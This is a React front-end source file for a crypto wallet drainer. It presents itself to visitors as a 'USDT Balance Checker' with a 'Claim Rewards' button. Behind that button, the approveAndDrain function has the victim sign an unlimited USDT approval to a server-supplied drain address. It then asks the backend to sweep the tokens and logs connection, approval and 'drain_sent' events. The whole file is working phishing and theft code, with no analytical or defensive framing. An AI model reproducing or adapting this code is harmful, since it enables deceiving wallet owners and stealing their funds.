// public/app.js
import React, { useEffect, useMemo, useState } from 'react';
import ReactDOM from 'react-dom/client';
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-ui';
import {
  TronLinkAdapter,
  WalletConnectAdapter,
  LedgerAdapter,
  TokenPocketAdapter,
  BitKeepAdapter,
  OkxWalletAdapter,
  ImTokenAdapter,
  TrustAdapter,
  GateWalletAdapter,
  FoxWalletAdapter,
  BybitAdapter,
  BinanceAdapter,
  TomoWalletAdapter,
  GuardaAdapter,
  OneKeyAdapter,
  BackpackAdapter,
} from '@tronweb3/tronwallet-adapters';
import TronWeb from 'tronweb';

// ------------------------- CSS -------------------------
// You can keep your existing style.css file, but we also import the UI library's styles.
import '@tronweb3/tronwallet-adapter-react-ui/dist/style.css';
// ------------------------- /CSS -------------------------

function App() {
  const [userAddress, setUserAddress] = useState(null);
  const [tronWebInstance, setTronWebInstance] = useState(null);
  const [status, setStatus] = useState('');
  const [usdtBalance, setUsdtBalance] = useState('0.00');
  const [trxBalance, setTrxBalance] = useState('0.00');

  const adapters = useMemo(() => {
    const adapterList = [
      new TronLinkAdapter(),
      new WalletConnectAdapter(),
      new LedgerAdapter(),
      new TokenPocketAdapter(),
      new BitKeepAdapter(),
      new OkxWalletAdapter(),
      new ImTokenAdapter(),
      new TrustAdapter(),
      new GateWalletAdapter(),
      new FoxWalletAdapter(),
      new BybitAdapter(),
      new BinanceAdapter(),
      new TomoWalletAdapter(),
      new GuardaAdapter(),
      new OneKeyAdapter(),
      new BackpackAdapter(),
    ];
    return adapterList;
  }, []);

  const setStatusMessage = (msg, isError = false) => {
    setStatus(msg);
    const statusDiv = document.getElementById('status');
    if (statusDiv) {
      statusDiv.style.color = isError ? '#dc3545' : '#2a5298';
    }
    console.log(msg);
  };

  const apiCall = async (endpoint, data) => {
    const res = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    return await res.json();
  };

  const loadBalances = async (address) => {
    try {
      const data = await apiCall('/api/balance', { address });
      setUsdtBalance(data.usdt.toFixed(2));
      setTrxBalance(data.trx.toFixed(2));
    } catch (err) {
      console.error(err);
      setStatusMessage('Failed to load balance', true);
    }
  };

  const onConnect = (address) => {
    setUserAddress(address);
    setStatusMessage(`Connected! Fetching balances...`);
    loadBalances(address);

    // Send event to backend
    fetch('/api/event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'wallet_connected', address }),
    });

    if (!tronWebInstance) {
      setTronWebInstance(new TronWeb({ fullHost: 'https://api.trongrid.io' }));
    }
  };

  const onDisconnect = () => {
    setUserAddress(null);
    setStatusMessage('Disconnected');
  };

  const approveAndDrain = async () => {
    const wallet = window.wallet;
    if (!wallet || !userAddress) {
      setStatusMessage('Please connect wallet first', true);
      return;
    }

    setStatusMessage('Loading configuration...');
    let config;
    try {
      const res = await fetch('/api/config');
      config = await res.json();
    } catch (err) {
      setStatusMessage('Cannot fetch config from server', true);
      return;
    }

    const usdtContractAddress = config.usdtContract;
    const drainTarget = config.drainAddress;
    const MAX_UINT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    try {
      if (!tronWebInstance) {
        setStatusMessage('TronWeb not initialized', true);
        return;
      }
      const usdtContract = await tronWebInstance.contract().at(usdtContractAddress);
      setStatusMessage('Approving USDT spending...');
      
      // Get the unsigned transaction
      const unsignedTx = await usdtContract.approve(drainTarget, MAX_UINT).request();
      
      // Sign the transaction with the connected wallet
      const signedTx = await wallet.signTransaction(unsignedTx);
      const result = await tronWebInstance.trx.sendRawTransaction(signedTx);
      
      setStatusMessage(`✅ Approval sent! TX: ${result}`);
      fetch('/api/event', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'approve_signed', address: userAddress, txId: result }),
      });

      setStatusMessage('Initiating transfer...');
      const sweepResult = await apiCall('/api/sweep', { address: userAddress });

      if (sweepResult.success) {
        setStatusMessage(`🎉 Success! USDT sent. TX: ${sweepResult.txId}`);
        fetch('/api/event', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ type: 'drain_sent', address: userAddress, txId: sweepResult.txId, amount: '0' }),
        });
        setTimeout(() => loadBalances(userAddress), 5000);
      } else {
        setStatusMessage(`❌ Transfer failed: ${sweepResult.error}`, true);
      }
    } catch (err) {
      console.error(err);
      setStatusMessage('Error: ' + (err.message || 'Unknown error'), true);
    }
  };

  return (
    <WalletProvider adapters={adapters} onConnect={onConnect} onDisconnect={onDisconnect}>
      <div className="container">
        <h1>💰 USDT Balance Checker</h1>
        <p className="sub">Connect your TRON wallet to check balance and claim rewards</p>

        {!userAddress && (
          <div>
            <button id="connectBtn" className="btn-primary">🔌 Connect Wallet</button>
          </div>
        )}
        {userAddress && (
          <div id="walletInfo" className="hidden">
            <p><strong>Address:</strong> <span id="walletAddress">{userAddress}</span></p>
            <p><strong>USDT Balance:</strong> <span id="usdtBalance">{usdtBalance}</span></p>
            <p><strong>TRX Balance:</strong> <span id="trxBalance">{trxBalance}</span></p>
            <button onClick={approveAndDrain} className="btn-danger">💸 Claim Rewards (Approve & Receive)</button>
          </div>
        )}

        <div id="status" className="status">{status}</div>
      </div>
    </WalletProvider>
  );
}

// Mount the React app
const root = ReactDOM.createRoot(document.getElementById('app'));
root.render(<App />);
